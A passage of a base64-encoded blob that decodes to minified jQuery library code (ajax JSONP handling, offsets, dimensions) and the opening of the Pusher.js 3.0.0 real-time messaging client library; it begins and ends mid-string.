oIjxzY3JpcHQ+IikucHJvcCh7Y2hhcnNldDplLnNjcmlwdENoYXJzZXQsc3JjOmUudXJsfSkub24oImxvYWQgZXJyb3IiLG49ZnVuY3Rpb24oZSl7dC5yZW1vdmUoKSxuPW51bGwsZSYmaSgiZXJyb3IiPT09ZS50eXBlPzQwNDoyMDAsZS50eXBlKX0pLFouaGVhZC5hcHBlbmRDaGlsZCh0WzBdKX0sYWJvcnQ6ZnVuY3Rpb24oKXtuJiZuKCl9fX19KTt2YXIgSXQ9W10sV3Q9Lyg9KVw/KD89JnwkKXxcP1w/LztjZS5hamF4U2V0dXAoe2pzb25wOiJjYWxsYmFjayIsanNvbnBDYWxsYmFjazpmdW5jdGlvbigpe3ZhciBlPUl0LnBvcCgpfHxjZS5leHBhbmRvKyJfIitNdCsrO3JldHVybiB0aGlzW2VdPSEwLGV9fSksY2UuYWpheFByZWZpbHRlcigianNvbiBqc29ucCIsZnVuY3Rpb24oZSx0LHIpe3ZhciBpLHMsbyxhPWUuanNvbnAhPT0hMSYmKFd0LnRlc3QoZS51cmwpPyJ1cmwiOiJzdHJpbmciPT10eXBlb2YgZS5kYXRhJiYwPT09KGUuY29udGVudFR5cGV8fCIiKS5pbmRleE9mKCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSYmV3QudGVzdChlLmRhdGEpJiYiZGF0YSIpO3JldHVybiBhfHwianNvbnAiPT09ZS5kYXRhVHlwZXNbMF0/KGk9ZS5qc29ucENhbGxiYWNrPWNlLmlzRnVuY3Rpb24oZS5qc29ucENhbGxiYWNrKT9lLmpzb25wQ2FsbGJhY2soKTplLmpzb25wQ2FsbGJhY2ssYT9lW2FdPWVbYV0ucmVwbGFjZShXdCwiJDEiK2kpOmUuanNvbnAhPT0hMSYmKGUudXJsKz0oTHQudGVzdChlLnVybCk/IiYiOiI/IikrZS5qc29ucCsiPSIraSksZS5jb252ZXJ0ZXJzWyJzY3JpcHQganNvbiJdPWZ1bmN0aW9uKCl7cmV0dXJuIG98fGNlLmVycm9yKGkrIiB3YXMgbm90IGNhbGxlZCIpLG9bMF19LGUuZGF0YVR5cGVzWzBdPSJqc29uIixzPW5baV0sbltpXT1mdW5jdGlvbigpe289YXJndW1lbnRzfSxyLmFsd2F5cyhmdW5jdGlvbigpe3ZvaWQgMD09PXM/Y2UobikucmVtb3ZlUHJvcChpKTpuW2ldPXMsZVtpXSYmKGUuanNvbnBDYWxsYmFjaz10Lmpzb25wQ2FsbGJhY2ssSXQucHVzaChpKSksbyYmY2UuaXNGdW5jdGlvbihzKSYmcyhvWzBdKSxvPXM9dm9pZCAwfSksInNjcmlwdCIpOnZvaWQgMH0pLGNlLnBhcnNlSFRNTD1mdW5jdGlvbihlLHQsbil7aWYoIWV8fCJzdHJpbmciIT10eXBlb2YgZSlyZXR1cm4gbnVsbDsiYm9vbGVhbiI9PXR5cGVvZiB0JiYobj10LHQ9ITEpLHQ9dHx8Wjt2YXIgcj1nZS5leGVjKGUpLGk9IW4mJltdO3JldHVybiByP1t0LmNyZWF0ZUVsZW1lbnQoclsxXSldOihyPW0oW2VdLHQsaSksaSYmaS5sZW5ndGgmJmNlKGkpLnJlbW92ZSgpLGNlLm1lcmdlKFtdLHIuY2hpbGROb2RlcykpfTt2YXIgVXQ9Y2UuZm4ubG9hZDtjZS5mbi5sb2FkPWZ1bmN0aW9uKGUsdCxuKXtpZigic3RyaW5nIiE9dHlwZW9mIGUmJlV0KXJldHVybiBVdC5hcHBseSh0aGlzLGFyZ3VtZW50cyk7dmFyIHIsaSxzLG89dGhpcyxhPWUuaW5kZXhPZigiICIpO3JldHVybiBhPi0xJiYocj1jZS50cmltKGUuc2xpY2UoYSkpLGU9ZS5zbGljZSgwLGEpKSxjZS5pc0Z1bmN0aW9uKHQpPyhuPXQsdD12b2lkIDApOnQmJiJvYmplY3QiPT10eXBlb2YgdCYmKGk9IlBPU1QiKSxvLmxlbmd0aD4wJiZjZS5hamF4KHt1cmw6ZSx0eXBlOml8fCJHRVQiLGRhdGFUeXBlOiJodG1sIixkYXRhOnR9KS5kb25lKGZ1bmN0aW9uKGUpe3M9YXJndW1lbnRzLG8uaHRtbChyP2NlKCI8ZGl2PiIpLmFwcGVuZChjZS5wYXJzZUhUTUwoZSkpLmZpbmQocik6ZSl9KS5hbHdheXMobiYmZnVuY3Rpb24oZSx0KXtvLmVhY2goZnVuY3Rpb24oKXtuLmFwcGx5KHRoaXMsc3x8W2UucmVzcG9uc2VUZXh0LHQsZV0pfSl9KSx0aGlzfSxjZS5lYWNoKFsiYWpheFN0YXJ0IiwiYWpheFN0b3AiLCJhamF4Q29tcGxldGUiLCJhamF4RXJyb3IiLCJhamF4U3VjY2VzcyIsImFqYXhTZW5kIl0sZnVuY3Rpb24oZSx0KXtjZS5mblt0XT1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5vbih0LGUpfX0pLGNlLmV4cHIuZmlsdGVycy5hbmltYXRlZD1mdW5jdGlvbihlKXtyZXR1cm4gY2UuZ3JlcChjZS50aW1lcnMsZnVuY3Rpb24odCl7cmV0dXJuIGU9PT10LmVsZW19KS5sZW5ndGh9LGNlLm9mZnNldD17c2V0T2Zmc2V0OmZ1bmN0aW9uKGUsdCxuKXt2YXIgcixpLHMsbyxhLHUsYyxsPWNlLmNzcyhlLCJwb3NpdGlvbiIpLGQ9Y2UoZSksaD17fTsic3RhdGljIj09PWwmJihlLnN0eWxlLnBvc2l0aW9uPSJyZWxhdGl2ZSIpLGE9ZC5vZmZzZXQoKSxzPWNlLmNzcyhlLCJ0b3AiKSx1PWNlLmNzcyhlLCJsZWZ0IiksYz0oImFic29sdXRlIj09PWx8fCJmaXhlZCI9PT1sKSYmKHMrdSkuaW5kZXhPZigiYXV0byIpPi0xLGM/KHI9ZC5wb3NpdGlvbigpLG89ci50b3AsaT1yLmxlZnQpOihvPXBhcnNlRmxvYXQocyl8fDAsaT1wYXJzZUZsb2F0KHUpfHwwKSxjZS5pc0Z1bmN0aW9uKHQpJiYodD10LmNhbGwoZSxuLGNlLmV4dGVuZCh7fSxhKSkpLG51bGwhPXQudG9wJiYoaC50b3A9dC50b3AtYS50b3ArbyksbnVsbCE9dC5sZWZ0JiYoaC5sZWZ0PXQubGVmdC1hLmxlZnQraSksInVzaW5nImluIHQ/dC51c2luZy5jYWxsKGUsaCk6ZC5jc3MoaCl9fSxjZS5mbi5leHRlbmQoe29mZnNldDpmdW5jdGlvbihlKXtpZihhcmd1bWVudHMubGVuZ3RoKXJldHVybiB2b2lkIDA9PT1lP3RoaXM6dGhpcy5lYWNoKGZ1bmN0aW9uKHQpe2NlLm9mZnNldC5zZXRPZmZzZXQodGhpcyxlLHQpfSk7dmFyIHQsbixyPXRoaXNbMF0saT17dG9wOjAsbGVmdDowfSxzPXImJnIub3duZXJEb2N1bWVudDtpZihzKXJldHVybiB0PXMuZG9jdW1lbnRFbGVtZW50LGNlLmNvbnRhaW5zKHQscik/KGk9ci5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKSxuPVEocykse3RvcDppLnRvcCtuLnBhZ2VZT2Zmc2V0LXQuY2xpZW50VG9wLGxlZnQ6aS5sZWZ0K24ucGFnZVhPZmZzZXQtdC5jbGllbnRMZWZ0fSk6aX0scG9zaXRpb246ZnVuY3Rpb24oKXtpZih0aGlzWzBdKXt2YXIgZSx0LG49dGhpc1swXSxyPXt0b3A6MCxsZWZ0OjB9O3JldHVybiJmaXhlZCI9PT1jZS5jc3MobiwicG9zaXRpb24iKT90PW4uZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCk6KGU9dGhpcy5vZmZzZXRQYXJlbnQoKSx0PXRoaXMub2Zmc2V0KCksY2Uubm9kZU5hbWUoZVswXSwiaHRtbCIpfHwocj1lLm9mZnNldCgpKSxyLnRvcCs9Y2UuY3NzKGVbMF0sImJvcmRlclRvcFdpZHRoIiwhMCksci5sZWZ0Kz1jZS5jc3MoZVswXSwiYm9yZGVyTGVmdFdpZHRoIiwhMCkpLHt0b3A6dC50b3Atci50b3AtY2UuY3NzKG4sIm1hcmdpblRvcCIsITApLGxlZnQ6dC5sZWZ0LXIubGVmdC1jZS5jc3MobiwibWFyZ2luTGVmdCIsITApfX19LG9mZnNldFBhcmVudDpmdW5jdGlvbigpe3JldHVybiB0aGlzLm1hcChmdW5jdGlvbigpe2Zvcih2YXIgZT10aGlzLm9mZnNldFBhcmVudDtlJiYic3RhdGljIj09PWNlLmNzcyhlLCJwb3NpdGlvbiIpOyllPWUub2Zmc2V0UGFyZW50O3JldHVybiBlfHxudH0pfX0pLGNlLmVhY2goe3Njcm9sbExlZnQ6InBhZ2VYT2Zmc2V0IixzY3JvbGxUb3A6InBhZ2VZT2Zmc2V0In0sZnVuY3Rpb24oZSx0KXt2YXIgbj0icGFnZVlPZmZzZXQiPT09dDtjZS5mbltlXT1mdW5jdGlvbihyKXtyZXR1cm4gRGUodGhpcyxmdW5jdGlvbihlLHIsaSl7dmFyIHM9UShlKTtyZXR1cm4gdm9pZCAwPT09aT9zP3NbdF06ZVtyXTp2b2lkKHM/cy5zY3JvbGxUbyhuP3MucGFnZVhPZmZzZXQ6aSxuP2k6cy5wYWdlWU9mZnNldCk6ZVtyXT1pKX0sZSxyLGFyZ3VtZW50cy5sZW5ndGgpfX0pLGNlLmVhY2goWyJ0b3AiLCJsZWZ0Il0sZnVuY3Rpb24oZSx0KXtjZS5jc3NIb29rc1t0XT1IKGFlLnBpeGVsUG9zaXRpb24sZnVuY3Rpb24oZSxuKXtyZXR1cm4gbj8obj1qKGUsdCksWmUudGVzdChuKT9jZShlKS5wb3NpdGlvbigpW3RdKyJweCI6bik6dm9pZCAwfSl9KSxjZS5lYWNoKHtIZWlnaHQ6ImhlaWdodCIsV2lkdGg6IndpZHRoIn0sZnVuY3Rpb24oZSx0KXtjZS5lYWNoKHtwYWRkaW5nOiJpbm5lciIrZSxjb250ZW50OnQsIiI6Im91dGVyIitlfSxmdW5jdGlvbihuLHIpe2NlLmZuW3JdPWZ1bmN0aW9uKHIsaSl7dmFyIHM9YXJndW1lbnRzLmxlbmd0aCYmKG58fCJib29sZWFuIiE9dHlwZW9mIHIpLG89bnx8KHI9PT0hMHx8aT09PSEwPyJtYXJnaW4iOiJib3JkZXIiKTtyZXR1cm4gRGUodGhpcyxmdW5jdGlvbih0LG4scil7dmFyIGk7cmV0dXJuIGNlLmlzV2luZG93KHQpP3QuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyJjbGllbnQiK2VdOjk9PT10Lm5vZGVUeXBlPyhpPXQuZG9jdW1lbnRFbGVtZW50LE1hdGgubWF4KHQuYm9keVsic2Nyb2xsIitlXSxpWyJzY3JvbGwiK2VdLHQuYm9keVsib2Zmc2V0IitlXSxpWyJvZmZzZXQiK2VdLGlbImNsaWVudCIrZV0pKTp2b2lkIDA9PT1yP2NlLmNzcyh0LG4sbyk6Y2Uuc3R5bGUodCxuLHIsbyl9LHQscz9yOnZvaWQgMCxzLG51bGwpfX0pfSksY2UuZm4uZXh0ZW5kKHtiaW5kOmZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gdGhpcy5vbihlLG51bGwsdCxuKX0sdW5iaW5kOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMub2ZmKGUsbnVsbCx0KX0sZGVsZWdhdGU6ZnVuY3Rpb24oZSx0LG4scil7cmV0dXJuIHRoaXMub24odCxlLG4scil9LHVuZGVsZWdhdGU6ZnVuY3Rpb24oZSx0LG4pe3JldHVybiAxPT09YXJndW1lbnRzLmxlbmd0aD90aGlzLm9mZihlLCIqKiIpOnRoaXMub2ZmKHQsZXx8IioqIixuKX0sc2l6ZTpmdW5jdGlvbigpe3JldHVybiB0aGlzLmxlbmd0aH19KSxjZS5mbi5hbmRTZWxmPWNlLmZuLmFkZEJhY2sscj1bXSxpPWZ1bmN0aW9uKCl7cmV0dXJuIGNlfS5hcHBseSh0LHIpLCEodm9pZCAwIT09aSYmKGUuZXhwb3J0cz1pKSk7dmFyIHp0PW4ualF1ZXJ5LHF0PW4uJDtyZXR1cm4gY2Uubm9Db25mbGljdD1mdW5jdGlvbihlKXtyZXR1cm4gbi4kPT09Y2UmJihuLiQ9cXQpLGUmJm4ualF1ZXJ5PT09Y2UmJihuLmpRdWVyeT16dCksY2V9LHN8fChuLmpRdWVyeT1uLiQ9Y2UpLGNlfSl9LGZ1bmN0aW9uKGUsdCxuKXt2YXIgcixpOw0KLyogPCEtLSBNb3JlIGpRdWVyeSAoYW5kIHByb2JyYWJseSBTaXp6bGUuanMgdjIuMi4xKSAqLw0KDQovKiA8IS0tIFB1c2hlci5qcyAzLjAuMCAqLw0KIWZ1bmN0aW9uKG4scyl7cj1bXSxpPWZ1bmN0aW9uKCl7cmV0dXJuIG4uUHVzaGVyPXMoKX0uYXBwbHkodCxyKSwhKHZvaWQgMCE9PWkmJihlLmV4cG9ydHM9aSkpfSh0aGlzLGZ1bmN0aW9uKCl7cmV0dXJuIGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShuLHIpe3Qobikscj1yfHx7fTt2YXIgaT10aGlzO3RoaXMua2V5PW4sdGhpcy5jb25maWc9ZS5VdGlsLmV4dGVuZChlLmdldEdsb2JhbENvbmZpZygpLHIuY2x1c3Rlcj9lLmdldENsdXN0ZXJDb25maWcoci5jbHVzdGVyKTp7fSxyKSx0aGlzLmNoYW5uZWxzPW5ldyBlLkNoYW5uZWxzLHRoaXMuZ2xvYmFsX2VtaXR0ZXI9bmV3IGUuRXZlbnRzRGlzcGF0Y2hlcix0aGlzLnNlc3Npb25JRD1NYXRoLmZsb29yKDFlOSpNYXRoLnJhbmRvbSgpKSx0aGlzLnRpbWVsaW5lPW5ldyBlLlRpbWVsaW5lKHRoaXMua2V5LHRoaXMuc2Vzc2lvbklELHtjbHVzdGVyOnRoaXMuY29uZmlnLmNsdXN0ZXIsZmVhdHVyZXM6ZS5VdGlsLmdldENsaWVudEZlYXR1cmVzKCkscGFyYW1zOnRoaXMuY29uZmlnLnRpbWVsaW5lUGFyYW1zfHx7fSxsaW1pdDo1MCxsZXZlbDplLlRpbWVsaW5lLklORk8sdmVyc2lvbjplLlZFUlNJT059KSx0aGlzLmNvbmZpZy5kaXNhYmxlU3RhdHN8fCh0aGlzLnRpbWVsaW5lU2VuZGVyPW5ldyBlLlRpbWVsaW5lU2VuZGVyKHRoaXMudGltZWxpbmUse2hvc3Q6dGhpcy5jb25maWcuc3RhdHNIb3N0LHBhdGg6Ii90aW1lbGluZS92Mi9qc29ucCJ9KSk7dmFyIHM9ZnVuY3Rpb24odCl7dmFyIG49ZS5VdGlsLmV4dGVuZCh7fSxpLmNvbmZpZyx0KTtyZXR1cm4gZS5TdHJhdGVneUJ1aWxkZXIuYnVpbGQoZS5nZXREZWZhdWx0U3RyYXRlZ3kobiksbil9O3RoaXMuY29ubmVjdGlvbj1uZXcgZS5Db25uZWN0aW9uTWFuYWdlcih0aGlzLmtleSxlLlV0aWwuZXh0ZW5kKHtnZXRTdHJhdGVneTpzLHRpbWVsaW5lOnRoaXMudGltZWxpbmUsYWN0aXZpdHlUaW1lb3V0OnRoaXMuY29uZmlnLmFjdGl2aXR5X3RpbWVvdXQscG9uZ1RpbWVvdXQ6dGhpcy5jb25maWcucG9uZ190aW1lb3V0LHVuYXZhaWxhYmxlVGltZW91dDp0aGlzLmNvbmZpZy51bmF2YWlsYWJsZV90aW1lb3V0fSx0aGlzLmNvbmZpZyx7ZW5jcnlwdGVkOnRoaXMuaXNFbmNyeXB0ZWQoKX0pKSx0aGlzLmNvbm5lY3Rpb24uYmluZCgiY29ubmVjdGVkIixmdW5jdGlvbigpe2kuc3Vic2NyaWJlQWxsKCksaS50aW1lbGluZVNlbmRlciYmaS50aW1lbGluZVNlbmRlci5zZW5kKGkuY29ubmVjdGlvbi5pc0VuY3J5cHRlZCgpKX0pLHRoaXMuY29ubmVjdGlvbi5iaW5kKCJtZXNzYWdlIixmdW5jdGlvbihlKXt2YXIgdD0wPT09ZS5ldmVudC5pbmRleE9mKCJwdXNoZXJfaW50ZXJuYWw6Iik7aWYoZS5jaGFubmVsKXt2YXIgbj1pLmNoYW5uZWwoZS5jaGFubmVsKTtuJiZuLmhhbmRsZUV2ZW50KGUuZXZlbnQsZS5kYXRhKX10fHxpLmdsb2JhbF9lbWl0dGVyLmVtaXQoZS5ldmVudCxlLmRhdGEpfSksdGhpcy5jb25uZWN0aW9uLmJpbmQoImRpc2Nvbm5lY3RlZCIsZnVuY3Rpb24oKXtpLmNoYW5uZWxzLmRpc2Nvbm5lY3QoKX0pLHRoaXMuY29ubmVjdGlvbi5iaW5kKCJlcnJvciIsZnVuY3Rpb24odCl7ZS53YXJuKCJFcnJvciIsdCl9KSxlLmluc3RhbmNlcy5wdXNoKHRoaXMpLHRoaXMudGltZWxpbmUuaW5mbyh7aW5zdGFuY2VzOmUuaW5zdGFuY2VzLmxlbmd0aH0pLGUuaXNSZWFkeSYmaS5jb25uZWN0KCl9ZnVuY3Rpb24gdCh0KXtudWxsIT09dCYmdm9pZCAwIT09dHx8ZS53YXJuKCJXYXJuaW5nIiwiWW91IG11c3QgcGFzcyB5b3VyIGFwcCBrZXkgd2hlbiB5b3UgaW5zdGFudGlhdGUgUHVzaGVyLiIpfXZhciBuPWUucHJvdG90eXBlO2UuaW5zdGFuY2VzPVtdLGUuaXNSZWFkeT0hMSxlLmRlYnVnPWZ1bmN0aW9uKCl7ZS5sb2cmJmUubG9nKGUuVXRpbC5zdHJpbmdpZnkuYXBwbHkodGhpcyxhcmd1bWVudHMpKX0sZS53YXJuPWZ1bmN0aW9uKCl7dmFyIHQ9ZS5VdGlsLnN0cmluZ2lmeS5hcHBseSh0aGlzLGFyZ3VtZW50cyk7d2luZG93LmNvbnNvbGUmJih3aW5kb3cuY29uc29sZS53YXJuP3dpbmRvdy5jb25zb2xlLndhcm4odCk6d2luZG93LmNvbnNvbGUubG9nJiZ3aW5kb3cuY29uc29sZS5sb2codCkpLGUubG9nJiZlLmxvZyh0KX0sZS5yZWFkeT1mdW5jdGlvbigpe2UuaXNSZWFkeT0hMDtmb3IodmFyIHQ9MCxuPWUuaW5zdGFuY2VzLmxlbmd0aDtuPnQ7dCsrKWUuaW5zdGFuY2VzW3RdLmNvbm5lY3QoKX0sbi5jaGFubmVsPWZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLmNoYW5uZWxzLmZpbmQoZSl9LG4uYWxsQ2hhbm5lbHM9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5jaGFubmVscy5hbGwoKX0sbi5jb25uZWN0PWZ1bmN0aW9uKCl7aWYodGhpcy5jb25uZWN0aW9uLmNvbm5lY3QoKSx0aGlzLnRpbWVsaW5lU2VuZGVyJiYhdGhpcy50aW1lbGluZVNlbmRlclRpbWVyKXt2YXIgdD10aGlzLmNvbm5lY3Rpb24uaXNFbmNyeXB0ZWQoKSxuPXRoaXMudGltZWxpbmVTZW5kZXI7dGhpcy50aW1lbGluZVNlbmRlclRpbWVyPW5ldyBlLlBlcmlvZGljVGltZXIoNmU0LGZ1bmN0aW9uKCl7bi5zZW5kKHQpfSl9fSxuLmRpc2Nvbm5lY3Q9ZnVuY3Rpb24oKXt0aGlzLmNvbm5lY3Rpb24uZGlzY29ubmVjdCgpLHRoaXMudGltZWxpbmVTZW5kZXJUaW1lciYmKHRoaXMudGltZWxpbmVTZW5kZXJUaW1lci5lbnN1cmVBYm9ydGVkKCksdGhpcy50aW1lbGluZVNlbmRlclRpbWVyPW51bGwpfSxuLmJpbmQ9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gdGhpcy5nbG9iYWxfZW1pdHRlci5iaW5kKGUsdCksdGhpc30sbi5iaW5kX2FsbD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5nbG9iYWxfZW1pdHRlci5iaW5kX2FsbChlKSx0aGlzfSxuLnN1YnNjcmliZUFsbD1mdW5jdGlvbigpe3ZhciBlO2ZvcihlIGluIHRoaXMuY2hhbm5lbHMuY2hhbm5lbHMpdGhpcy5jaGFubmVscy5jaGFubmVscy5oYXNPd25Qcm9wZXJ0eShlKSYmdGhpcy5zdWJzY3JpYmUoZSl9LG4uc3Vic2NyaWJlPWZ1bmN0aW9uKGUpe3ZhciB0PXRoaXMuY2hhbm5lbHMuYWRkKGUsdGhpcyk7cmV0dXJuImNvbm5lY3RlZCI9PT10aGlzLmNvbm5lY3Rpb24uc3RhdGUmJnQuc3Vic2NyaWJlKCksdH0sbi51bnN1YnNjcmliZT1mdW5jdGlvbihlKXt2YXIgdD10aGlzLmNoYW5uZWxzLnJlbW92ZShlKTt0JiYiY29ubmVjdGVkIj09PXRoaXMuY29ubmVjdGlvbi5zdGF0ZSYmdC51bnN1YnNjcmliZSgpfSxuLnNlbmRfZXZlbnQ9ZnVuY3Rpb24oZSx0LG4pe3JldHVybiB0aGlzLmNvbm5lY3Rpb24uc2VuZF9ldmVudChlLHQsbil9LG4uaXNFbmNyeXB0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4iaHR0cHM6Ij09PWUuVXRpbC5nZXREb2N1bWVudCgpLmxvY2F0aW9uLnByb3RvY29sPyEwOkJvb2xlYW4odGhpcy5jb25maWcuZW5jcnlwdGVkKX0sZS5IVFRQPXt9LHRoaXMuUHVzaGVyPWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUpe3dpbmRvdy5jbGVhclRpbWVvdXQoZSl9ZnVuY3Rpb24gdChlKXt3aW5kb3cuY2xlYXJJbnRlcnZhbChlKX1mdW5jdGlvbiBuKGUsdCxuLHIpe3ZhciBpPXRoaXM7dGhpcy5jbGVhcj10LHRoaXMudGltZXI9ZShmdW5jdGlvbigpe251bGwhPT1pLnRpbWVyJiYoaS50aW1lcj1yKGkudGltZXIpKX0sbil9dmFyIHI9bi5wcm90b3R5cGU7ci5pc1J1bm5pbmc9ZnVuY3Rpb24oKXtyZXR1cm4gbnVsbCE9PXRoaXMudGltZXJ9LHIuZW5zdXJlQWJvcnRlZD1mdW5jdGlvbigpe3RoaXMudGltZXImJih0aGlzLmNsZWFyKHRoaXMudGltZXIpLHRoaXMudGltZXI9bnVsbCl9LFB1c2hlci5UaW1lcj1mdW5jdGlvbih0LHIpe3JldHVybiBuZXcgbihzZXRUaW1lb3V0LGUsdCxmdW5jdGlvbihlKXtyZXR1cm4gcigpLG51bGx9KX0sUHVzaGVyLlBlcmlvZGljVGltZXI9ZnVuY3Rpb24oZSxyKXtyZXR1cm4gbmV3IG4oc2V0SW50ZXJ2YWwsdCxlLGZ1bmN0aW9uKGUpe3JldHVybiByKCksZX0pfX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe1B1c2hlci5VdGlsPXtub3c6ZnVuY3Rpb24oKXtyZXR1cm4gRGF0ZS5ub3c/RGF0ZS5ub3coKToobmV3IERhdGUpLnZhbHVlT2YoKX0sZGVmZXI6ZnVuY3Rpb24oZSl7cmV0dXJuIG5ldyBQdXNoZXIuVGltZXIoMCxlKX0sZXh0ZW5kOmZ1bmN0aW9uKGUpe2Zvcih2YXIgdD0xO3Q8YXJndW1lbnRzLmxlbmd0aDt0Kyspe3ZhciBuPWFyZ3VtZW50c1t0XTtmb3IodmFyIHIgaW4gbiluW3JdJiZuW3JdLmNvbnN0cnVjdG9yJiZuW3JdLmNvbnN0cnVjdG9yPT09T2JqZWN0P2Vbcl09UHVzaGVyLlV0aWwuZXh0ZW5kKGVbcl18fHt9LG5bcl0pOmVbcl09bltyXX1yZXR1cm4gZX0sc3RyaW5naWZ5OmZ1bmN0aW9uKCl7Zm9yKHZhciBlPVsiUHVzaGVyIl0sdD0wO3Q8YXJndW1lbnRzLmxlbmd0aDt0KyspInN0cmluZyI9PXR5cGVvZiBhcmd1bWVudHNbdF0/ZS5wdXNoKGFyZ3VtZW50c1t0XSk6dm9pZCAwPT09d2luZG93LkpTT04/ZS5wdXNoKGFyZ3VtZW50c1t0XS50b1N0cmluZygpKTplLnB1c2goSlNPTi5zdHJpbmdpZnkoYXJndW1lbnRzW3RdKSk7cmV0dXJuIGUuam9pbigiIDogIil9LGFycmF5SW5kZXhPZjpmdW5jdGlvbihlLHQpe3ZhciBuPUFycmF5LnByb3RvdHlwZS5pbmRleE9mO2lmKG51bGw9PT1lKXJldHVybi0xO2lmKG4mJmUuaW5kZXhPZj09PW4pcmV0dXJuIGUuaW5kZXhPZih0KTtmb3IodmFyIHI9MCxpPWUubGVuZ3RoO2k+cjtyKyspaWYoZVtyXT09PXQpcmV0dXJuIHI7cmV0dXJuLTF9LG9iamVjdEFwcGx5OmZ1bmN0aW9uKGUsdCl7Zm9yKHZhciBuIGluIGUpT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUsbikmJnQoZVtuXSxuLGUpfSxrZXlzOmZ1bmN0aW9uKGUpe3ZhciB0PVtdO3JldHVybiBQdXNoZXIuVXRpbC5vYmplY3RBcHBseShlLGZ1bmN0aW9uKGUsbil7dC5wdXNoKG4pfSksdH0sdmFsdWVzOmZ1bmN0aW9uKGUpe3ZhciB0PVtdO3JldHVybiBQdXNoZXIuVXRpbC5vYmplY3RBcHBseShlLGZ1bmN0aW9uKGUpe3QucHVzaChlKX0pLHR9LGFwcGx5OmZ1bmN0aW9uKGUsdCxuKXtmb3IodmFyIHI9MDtyPGUubGVuZ3RoO3IrKyl0LmNhbGwobnx8d2luZG93LGVbcl0scixlKX0sbWFwOmZ1bmN0aW9uKGUsdCl7Zm9yKHZhciBuPVtdLHI9MDtyPGUubGVuZ3RoO3IrKyluLnB1c2godChlW3JdLHIsZSxuKSk7cmV0dXJuIG59LG1hcE9iamVjdDpmdW5jdGlvbihlLHQpe3ZhciBuPXt9O3JldHVybiBQdXNoZXIuVXRpbC5vYmplY3RBcHBseShlLGZ1bmN0aW9uKGUscil7bltyXT10KGUpfSksbn0sZmlsdGVyOmZ1bmN0aW9uKGUsdCl7dD10fHxmdW5jdGlvbihlKXtyZXR1cm4hIWV9O2Zvcih2YXIgbj1bXSxyPTA7cjxlLmxlbmd0aDtyKyspdChlW3JdLHIsZSxuKSYmbi5wdXNoKGVbcl0pO3JldHVybiBufSxmaWx0ZXJPYmplY3Q6ZnVuY3Rpb24oZSx0KXt2YXIgbj17fTtyZXR1cm4gUHVzaGVyLlV0aWwub2JqZWN0QXBwbHkoZSxmdW5jdGlvbihyLGkpeyh0JiZ0KHIsaSxlLG4pfHxCb29sZWFuKHIpKSYmKG5baV09cil9KSxufSxmbGF0dGVuOmZ1bmN0aW9uKGUpe3ZhciB0PVtdO3JldHVybiBQdXNoZXIuVXRpbC5vYmplY3RBcHBseShlLGZ1bmN0aW9uKGUsbil7dC5wdXNoKFtuLGVdKX0pLHR9LGFueTpmdW5jdGlvbihlLHQpe2Zvcih2YXIgbj0wO248ZS5sZW5ndGg7bisrKWlmKHQoZVtuXSxuLGUpKXJldHVybiEwO3JldHVybiExfSxhbGw6ZnVuY3Rpb24oZSx0KXtmb3IodmFyIG49MDtuPGUubGVuZ3RoO24rKylpZighdChlW25dLG4sZSkpcmV0dXJuITE7cmV0dXJuITB9LG1ldGhvZDpmdW5jdGlvbihlKXt2YXIgdD1BcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMsMSk7cmV0dXJuIGZ1bmN0aW9uKG4pe3JldHVybiBuW2VdLmFwcGx5KG4sdC5jb25jYXQoYXJndW1lbnRzKSl9fSxnZXRXaW5kb3c6ZnVuY3Rpb24oKXtyZXR1cm4gd2luZG93fSxnZXREb2N1bWVudDpmdW5jdGlvbigpe3JldHVybiBkb2N1bWVudH0sZ2V0TG9jYWxTdG9yYWdlOmZ1bmN0aW9uKCl7dHJ5e3JldHVybiB3aW5kb3cubG9jYWxTdG9yYWdlfWNhdGNoKGUpe3JldHVybn19LGdldENsaWVudEZlYXR1cmVzOmZ1bmN0aW9uKCl7cmV0dXJuIFB1c2hlci5VdGlsLmtleXMoUHVzaGVyLlV0aWwuZmlsdGVyT2JqZWN0KHt3czpQdXNoZXIuV1NUcmFuc3BvcnR9LGZ1bmN0aW9uKGUpe3JldHVybiBlLmlzU3VwcG9ydGVkKHt9KX0pKX0sYWRkV2luZG93TGlzdGVuZXI6ZnVuY3Rpb24oZSx0KXt2YXIgbj1QdXNoZXIuVXRpbC5nZXRXaW5kb3coKTt2b2lkIDAhPT1uLmFkZEV2ZW50TGlzdGVuZXI/bi5hZGRFdmVudExpc3RlbmVyKGUsdCwhMSk6bi5hdHRhY2hFdmVudCgib24iK2UsdCl9LHJlbW92ZVdpbmRvd0xpc3RlbmVyOmZ1bmN0aW9uKGUsdCl7dmFyIG49UHVzaGVyLlV0aWwuZ2V0V2luZG93KCk7dm9pZCAwIT09bi5hZGRFdmVudExpc3RlbmVyP24ucmVtb3ZlRXZlbnRMaXN0ZW5lcihlLHQsITEpOm4uZGV0YWNoRXZlbnQoIm9uIitlLHQpfSxpc1hIUlN1cHBvcnRlZDpmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5YTUxIdHRwUmVxdWVzdDtyZXR1cm4gQm9vbGVhbihlKSYmdm9pZCAwIT09KG5ldyBlKS53aXRoQ3JlZGVudGlhbHN9LGlzWERSU3VwcG9ydGVkOmZ1bmN0aW9uKGUpe3ZhciB0PWU/Imh0dHBzOiI6Imh0dHA6IixuPVB1c2hlci5VdGlsLmdldERvY3VtZW50KCkubG9jYXRpb24ucHJvdG9jb2w7cmV0dXJuIEJvb2xlYW4od2luZG93LlhEb21haW5SZXF1ZXN0KSYmbj09PXR9fX0uY2FsbCh0aGlzK